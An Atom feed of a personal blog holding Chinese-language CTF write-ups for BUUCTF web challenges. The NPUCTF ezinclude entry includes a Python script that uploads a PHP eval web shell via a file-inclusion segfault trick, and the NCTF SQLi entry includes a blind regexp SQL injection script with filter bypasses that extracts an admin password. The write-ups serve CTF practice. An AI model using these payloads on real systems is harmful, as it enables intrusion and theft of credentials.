<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Van</title>
  
  
  <link href="http://van0308.github.io/atom.xml" rel="self"/>
  
  <link href="http://van0308.github.io/"/>
  <updated>2023-02-14T14:34:52.984Z</updated>
  <id>http://van0308.github.io/</id>
  
  <author>
    <name>Van</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>网鼎杯2018]Unfinish</title>
    <link href="http://van0308.github.io/2023/02/14/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/"/>
    <id>http://van0308.github.io/2023/02/14/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/</id>
    <published>2023-02-14T14:34:52.000Z</published>
    <updated>2023-02-14T14:34:52.984Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>CISCN2019 华东南赛区]Double Secret</title>
    <link href="http://van0308.github.io/2023/02/14/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/"/>
    <id>http://van0308.github.io/2023/02/14/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/</id>
    <published>2023-02-14T14:29:34.000Z</published>
    <updated>2023-02-15T13:17:37.606Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/RABCDXB/article/details/122816156">https://blog.csdn.net/RABCDXB/article/details/122816156</a></p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105661450">https://blog.csdn.net/mochu7777777/article/details/105661450</a></p><p>&#x2F;secret</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/RABCDXB/article/details/122816156&quot;&gt;https://blog.csdn.net/RABCDXB/article/details/122816156&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[NPUCTF2020]ezinclude</title>
    <link href="http://van0308.github.io/2023/02/14/NPUCTF2020-ezinclude/"/>
    <id>http://van0308.github.io/2023/02/14/NPUCTF2020-ezinclude/</id>
    <published>2023-02-14T12:13:44.000Z</published>
    <updated>2023-02-15T13:16:23.031Z</updated>
    
    <content type="html"><![CDATA[<p>做题：</p><p>打开直接提示用户名密码错误，看源代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">抓包发现有cookie是Hash=fa25e54758d5d5c1927781a6ede89f8a</span><br><span class="line">放包看响应有Set-Cookie: Hash=576322dd496b99d07b5b0f7fa7934a25;</span><br><span class="line">尝试传几个不同的name，发现hash随之改变</span><br><span class="line">猜测hash值就是md5后的结果</span><br><span class="line">传?name=1&amp;pass=576322dd496b99d07b5b0f7fa7934a25</span><br><span class="line">发现</span><br><span class="line">&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="line">           window.location.href=&quot;flflflflag.php&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">直接访问会跳转到404，则还是抓包</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">           <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;404.html&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">include($_GET[&quot;file&quot;])<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>文件包含，那么可以试试读取源码:（也可以试读取其他文件，但是试了找不到flag）</p><p>flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flflflflag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">@<span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">@<span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$name</span>)===<span class="variable">$pass</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span></span><br><span class="line"><span class="string">           window.location.href=&quot;flflflflag.php&quot;;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;Hash&quot;</span>,<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$name</span>),<span class="title function_ invoke__">time</span>()+<span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;username/password error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$secret</span>=<span class="string">&#x27;%^$&amp;$#fffdflag_is_not_here_ha_ha&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看不出什么端倪，那就应该还有其他文件，扫一下，发现有个老六dir.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/tmp&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>dir.php可以打印&#x2F;tmp下的内容，所以想方法将文件搞到tmp下</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><h4 id="法一利用PHP7版本漏洞-segment-fault特性"><a href="#法一利用PHP7版本漏洞-segment-fault特性" class="headerlink" title="法一利用PHP7版本漏洞 segment fault特性"></a>法一利用PHP7版本漏洞 segment fault特性</h4><p>原理参考：</p><p><a href="https://blog.csdn.net/weixin_45646006/article/details/120817553">https://blog.csdn.net/weixin_45646006/article/details/120817553</a></p><p>大概就是php:&#x2F;&#x2F;filter&#x2F;的过滤器strip_tags,存在漏洞可以让PHP执行时候出现segment fault，则此时上传文件会保存在缓存目录下，不会被垃圾回收机制清除。</p><p>默认是&#x2F;tmp目录下。只需要php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;xxx文件，同时再上传一个文件上去，就可以触发利用。</p><h5 id="过程与脚本"><a href="#过程与脚本" class="headerlink" title="过程与脚本"></a>过程与脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://93678a40-98db-4f30-ac85-4d6f0820e597.node4.buuoj.cn:81/\</span></span><br><span class="line"><span class="string">flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line">file_data = &#123;<span class="string">&quot;file&quot;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">res = requests.post(url=url,files=file_data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>运行后访问dir.php得到文件名，然后POST &#x2F;flflflflag.php?file&#x3D;&#x2F;tmp&#x2F;phpAJEMpx包含文件执行命令cmd&#x3D;phpinfo();flag就在里面。</p><p>PS：我试的时候，get和直接写入phpinfo都可以，但是写post就不行。不明所以。</p><p>而且get的时候flflflflag.php?file&#x3D;&#x2F;tmp&#x2F;phpAJEMpx&amp;cmd&#x3D;echo%20system(‘whoami’);没有回显</p><p>&#x2F;flflflflag.php?file&#x3D;&#x2F;tmp&#x2F;phpAJEMpx&amp;cmd&#x3D;echo%201;有回显。说明ban了一些东西。</p><p>可以用蚁剑连上去，然后用插件disable_function绕过就行了。（见之前文章）</p><h4 id="法二-利用-session-upload-progress-进行-session-文件包含"><a href="#法二-利用-session-upload-progress-进行-session-文件包含" class="headerlink" title="法二 利用 session.upload_progress 进行 session 文件包含"></a>法二 利用 session.upload_progress 进行 session 文件包含</h4><p>（坑）这个牵扯出东西有点多，先挖个坑</p><p><a href="https://syunaht.com/p/2193317358.html">https://syunaht.com/p/2193317358.html</a></p><p><a href="https://www.cnblogs.com/R3col/p/14929237.html">https://www.cnblogs.com/R3col/p/14929237.html</a></p><p><a href="https://fanygit.github.io/2021/10/18/[NPUCTF2020]ezinclude%201/">https://fanygit.github.io/2021/10/18/[NPUCTF2020]ezinclude%201/</a></p><p><a href="https://www.shawroot.cc/%e7%95%99%e8%a8%80%e6%9d%bf">https://www.shawroot.cc/%e7%95%99%e8%a8%80%e6%9d%bf</a></p><p><a href="http://www.snowywar.top/">http://www.snowywar.top/</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/114656092">https://blog.csdn.net/rfrder/article/details/114656092</a></p><p><a href="https://www.cnblogs.com/Article-kelp/p/14826360.html">https://www.cnblogs.com/Article-kelp/p/14826360.html</a></p><p><a href="https://blog.csdn.net/weixin_45646006/article/details/120817553">https://blog.csdn.net/weixin_45646006/article/details/120817553</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;做题：&lt;/p&gt;
&lt;p&gt;打开直接提示用户名密码错误，看源代码。&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;</summary>
      
    
    
    
    
    <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
    
    <category term="坑" scheme="http://van0308.github.io/tags/%E5%9D%91/"/>
    
  </entry>
  
  <entry>
    <title>[NCTF2019]SQLi</title>
    <link href="http://van0308.github.io/2023/02/14/NCTF2019-SQLi/"/>
    <id>http://van0308.github.io/2023/02/14/NCTF2019-SQLi/</id>
    <published>2023-02-14T10:01:20.000Z</published>
    <updated>2023-02-15T09:21:31.557Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="regexp-正则注入"><a href="#regexp-正则注入" class="headerlink" title="regexp 正则注入"></a>regexp 正则注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">select database() regexp &quot;^d&quot;; 输出是否数据库名开头是d</span><br><span class="line">^d是正则表达式，也可以用其他的如</span><br><span class="line">regexp &#x27;^[a-z]&#x27;  #判断一个表的第一个字符串是否在a-z中</span><br><span class="line">regexp &#x27;^r&#x27;      #判断第一个字符串是否为r</span><br><span class="line">regexp &#x27;^r[a-z]&#x27; #判断一个表的第二个字符串是否在a-z中</span><br><span class="line">regexp &#x27;y$&#x27;      #判断最后一个字符串是否为y</span><br><span class="line"></span><br><span class="line">（不过regexp不区分大小写）（坑）</span><br><span class="line">用or password regexp binary &#123;&#125;</span><br><span class="line">或者</span><br><span class="line">or (select binary username from users limit 0,1) regexp &#x27;^&#123;&#125;&#x27;--+</span><br><span class="line">https://blog.csdn.net/qq_43625917/article/details/105189912</span><br><span class="line">https://blog.csdn.net/qq_36761831/article/details/82862135</span><br></pre></td></tr></table></figure><h4 id="like注入"><a href="#like注入" class="headerlink" title="like注入"></a>like注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ps:这个是顺带学的</span><br><span class="line">百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线_通配符允许匹配任何单个字符。</span><br><span class="line">1.like &#x27;s%&#x27;判断第一个字符是否为s</span><br><span class="line">union select 1,database() like &#x27;s%&#x27;,3 --+</span><br><span class="line">2.like &#x27;se%&#x27;判断前面两个字符串是否为se</span><br><span class="line">union select 1,database() like &#x27;se%&#x27;,3 --+</span><br><span class="line">3.like &#x27;%sq%&#x27; 判断是否包含se两个字符串</span><br><span class="line">union select 1,database() like &#x27;%se%&#x27;,3 --+</span><br><span class="line">4.like &#x27;_____&#x27;判断是否为5个字符</span><br><span class="line">union select 1,database() like &#x27;_____&#x27;,3 --+</span><br><span class="line">5.like &#x27;s____&#x27; 判断第一个字符是否为s</span><br><span class="line">union select 1,database() like &#x27;s____&#x27;,3 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a>适用情况</h4><p>过滤了like，in,&#x3D;</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>打开是一个登录页面，还有弹窗和甩脸上的SQL语句。</p><p>​select * from users where username&#x3D;’’ and passwd&#x3D;’’</p><p>尝试登录无果，试一下寻找信息。发现有robots.txt</p><p>robots.txt有hint.txt</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$black_list <span class="operator">=</span> &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If $_POST[<span class="string">&#x27;passwd&#x27;</span>] <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> admin<span class="string">&#x27;s password,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Then you will get the flag;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">没有过滤\，则可以username中输入\，这样语句就变成了</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">由于一个单引号被转义，那么就username<span class="operator">=</span><span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;然后剩下一个单引号</span></span><br><span class="line"><span class="string">所以我们passwd可以输入我们要的语句||passwd regexp &quot;^a&quot;;%00</span></span><br><span class="line"><span class="string">即用00截断（题目PHP版本5.2.16），再补上分号符合格式</span></span><br><span class="line"><span class="string">这样整一条语句就变成</span></span><br><span class="line"><span class="string">select * from users where username=&#x27;</span>\<span class="string">&#x27; and passwd=&#x27;</span><span class="operator">||</span>passwd regexp &quot;^a&quot;;<span class="operator">%</span><span class="number">00</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">接下来只需要一直换正则内容就行，空格用/**/绕过，过滤常用注释符-&gt;00截断</span></span><br></pre></td></tr></table></figure><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><p>先burp跑一下，查看正确的，方便写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># buuctf web [NCTF2019]SQLi</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="comment"># 字典</span></span><br><span class="line">passwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line">string = string.ascii_lowercase + string.digits + <span class="string">&#x27;_&#x27;</span>  <span class="comment"># +string.ascii_letters</span></span><br><span class="line"><span class="comment"># 小写字母，数字，全部字母</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造字典</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dict_list = [ i for i in range(97,123)]</span></span><br><span class="line"><span class="comment"># shuzi = [i for i in range(48,58)]</span></span><br><span class="line"><span class="comment"># dict_list +=shuzi</span></span><br><span class="line"><span class="comment"># dict_list.append(95)</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://dadcd953-c830-4ce9-b813-b10e1544ac89.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> string:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;</span>.<span class="built_in">format</span>((passwd + m), parse.unquote(<span class="string">&#x27;%00&#x27;</span>))</span><br><span class="line">            <span class="comment">#  parse.unquote(&#x27;%00&#x27;)和quote ()相反，将转义符替换为原本的字符，比如会把&quot; %3A &quot;转义为&quot;: &quot;。</span></span><br><span class="line">            <span class="comment">#  &#x27;passwd&#x27;: &#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;\x00&#x27;.format((pw + i))</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;welcome&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            passwd += m</span><br><span class="line">            <span class="built_in">print</span>(passwd)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> m == <span class="string">&#x27;_&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;welcome&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(passwd)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="得到"><a href="#得到" class="headerlink" title="得到"></a>得到</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you_will_never_know7788990</span><br></pre></td></tr></table></figure><p>填入密码然后登录就可以得到flag</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>regexp注入，还有其他like注入，多掌握几种。闭合方式也不是只有单引号，也可以转义。SQL没有系统学过，还是有很多未掌握的知识</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://fanygit.github.io/2021/08/27/[NCTF2019]SQLi%201/">https://fanygit.github.io/2021/08/27/[NCTF2019]SQLi%201/</a></p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/106029042">https://blog.csdn.net/weixin_43610673/article/details/106029042</a></p><p><a href="https://blog.csdn.net/l2872253606/article/details/125265138">https://blog.csdn.net/l2872253606/article/details/125265138</a></p><p><a href="https://blog.csdn.net/SopRomeo/article/details/108983645">https://blog.csdn.net/SopRomeo/article/details/108983645</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a&gt;前置知识&lt;/h3&gt;&lt;h4 id=&quot;regexp-正则注入&quot;&gt;&lt;a href=&quot;#regexp-正则注入&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    
    <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
    
    <category term="坑" scheme="http://van0308.github.io/tags/%E5%9D%91/"/>
    
  </entry>
  
  <entry>
    <title>[网鼎杯 2018]Comment</title>
    <link href="http://van0308.github.io/2023/02/14/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/"/>
    <id>http://van0308.github.io/2023/02/14/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/</id>
    <published>2023-02-14T09:15:58.000Z</published>
    <updated>2023-02-14T09:55:40.142Z</updated>
    
    <content type="html"><![CDATA[<p>好像可以xss</p><p>在第一第三个栏写xss可以</p><p><a href="https://fanygit.github.io/2021/08/17/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment%201/">https://fanygit.github.io/2021/08/17/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment%201/</a></p><p><a href="https://mochazz.github.io/2018/09/01/2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E5%9B%9B%E5%9C%BA/#comment">https://mochazz.github.io/2018/09/01/2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E5%9B%9B%E5%9C%BA/#comment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;好像可以xss&lt;/p&gt;
&lt;p&gt;在第一第三个栏写xss可以&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://fanygit.github.io/2021/08/17/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment%201/&quot;&gt;https</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[SWPUCTF 2018]SimplePHP</title>
    <link href="http://van0308.github.io/2023/02/14/SWPUCTF-2018-SimplePHP/"/>
    <id>http://van0308.github.io/2023/02/14/SWPUCTF-2018-SimplePHP/</id>
    <published>2023-02-14T09:08:22.000Z</published>
    <updated>2023-02-14T09:08:45.065Z</updated>
    
    <content type="html"><![CDATA[<p>php伪协议好像不行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;php伪协议好像不行&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>GYCTF2020]Ezsqli</title>
    <link href="http://van0308.github.io/2023/02/14/GYCTF2020-Ezsqli/"/>
    <id>http://van0308.github.io/2023/02/14/GYCTF2020-Ezsqli/</id>
    <published>2023-02-14T08:35:29.000Z</published>
    <updated>2023-02-14T08:51:29.350Z</updated>
    
    <content type="html"><![CDATA[<p>21位傻批</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id=if(length(database())=21,1,0)</span><br><span class="line">give_grandpa_pa_pa_pa</span><br><span class="line"></span><br><span class="line">sys.x$schema_flattened_keys</span><br><span class="line">f1ag_1s_h3r3_hhhhh,users233333333333333</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>if(database()&#x3D;0x676976655f6772616e6470615f70615f70615f7061,1,0)</p><p><a href="https://blog.csdn.net/weixin_43940853/article/details/106164162">https://blog.csdn.net/weixin_43940853/article/details/106164162</a></p><p><a href="https://blog.csdn.net/fmyyy1/article/details/115447291">https://blog.csdn.net/fmyyy1/article/details/115447291</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;21位傻批&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/spa</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HFCTF2020]EasyLogin</title>
    <link href="http://van0308.github.io/2023/02/14/HFCTF2020-EasyLogin/"/>
    <id>http://van0308.github.io/2023/02/14/HFCTF2020-EasyLogin/</id>
    <published>2023-02-14T08:00:46.000Z</published>
    <updated>2023-02-14T08:35:03.181Z</updated>
    
    <content type="html"><![CDATA[<p>​</p><p>伪造得要token和username啥的都一致，然后发完，根据返回的setcookie，带着他去访问&#x2F;api&#x2F;flag</p><p><a href="https://blog.csdn.net/m0_62107966/article/details/126801065">https://blog.csdn.net/m0_62107966/article/details/126801065</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​	&lt;/p&gt;
&lt;p&gt;伪造得要token和username啥的都一致，然后发完，根据返回的setcookie，带着他去访问&amp;#x2F;api&amp;#x2F;flag&lt;/p&gt;
